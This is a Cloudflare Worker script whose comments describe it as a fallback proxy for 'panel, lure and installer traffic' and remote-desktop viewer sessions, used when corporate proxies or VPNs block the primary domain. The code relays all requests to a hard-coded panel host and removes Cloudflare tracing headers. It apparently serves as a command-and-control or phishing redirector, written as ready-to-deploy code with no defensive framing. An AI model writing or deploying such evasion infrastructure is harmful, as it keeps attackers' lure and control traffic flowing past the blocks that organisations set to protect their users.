// fleet edge fallback — proxies panel, lure and installer traffic through a
// *.workers.dev (or custom) host when the primary domain is blocked by a
// corporate proxy or VPN. WebSocket upgrades (RD viewer) pass straight through.
//
// The upstream origin is provided by the ORIGIN text binding (wrangler.toml or
// the deploy script). Only paths that exist on the panel are reachable: the
// Worker forwards the request verbatim and does not expose a directory tree.
export default {
  async fetch(request, env) {
    const origin = new URL(env.ORIGIN || "https://panel.telcom.stream");
    const url = new URL(request.url);
    const target = new URL(url.pathname + url.search, origin);

    if (request.headers.get("Upgrade") === "websocket") {
      return fetch(new Request(target.toString(), request));
    }

    const headers = new Headers(request.headers);
    headers.set("Host", origin.host);
    headers.set("X-Forwarded-Host", url.host);
    headers.set("X-Forwarded-Proto", "https");
    for (const h of [
      "cf-connecting-ip",
      "cf-ipcountry",
      "cf-ray",
      "cf-visitor",
      "cf-worker",
    ]) {
      headers.delete(h);
    }

    const init = { method: request.method, headers, redirect: "manual" };
    if (request.method !== "GET" && request.method !== "HEAD") {
      init.body = request.body;
    }

    const upstream = await fetch(target.toString(), init);
    const out = new Headers(upstream.headers);
    out.set("Cache-Control", "no-store");
    return new Response(upstream.body, {
      status: upstream.status,
      statusText: upstream.statusText,
      headers: out,
    });
  },
};
